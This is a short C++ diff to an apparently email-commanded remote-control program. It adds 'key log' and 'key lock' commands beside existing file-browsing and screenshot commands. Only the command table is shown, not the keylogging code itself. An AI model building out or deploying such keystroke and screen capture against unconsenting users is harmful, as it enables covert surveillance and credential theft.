@@ -4,6 +4,10 @@ map<string, map<string, pair<int, Function>>> requestTree = {
     {"file", {
         {"explore", {1, [](vector<string> params) { return showTree(params[0]); }}}
     }},
+    {"key", {
+        {"log", {1, [](vector<string> params) { return getKeyLog(stoi(params[0])); }}},
+        {"lock", {1, [](vector<string> params) { return keyLock(stoi(params[0])); }}}
+    }},
     {"screen", {
         {"get", {0, [](vector<string> params) { return getScreenshot("screenshot.png"); }}}
     }},
@@ -45,8 +49,8 @@ map<string, string> parseRequest(const string& sender, const string& subject, Fu
         response["command"] = subject;
         return response;
     }
-
     tokens.erase(tokens.begin()); // Remove the prefix
+
     if (tokens.empty()) {
         response["msg"] = "Command not found.";
         response["command"] = subject;
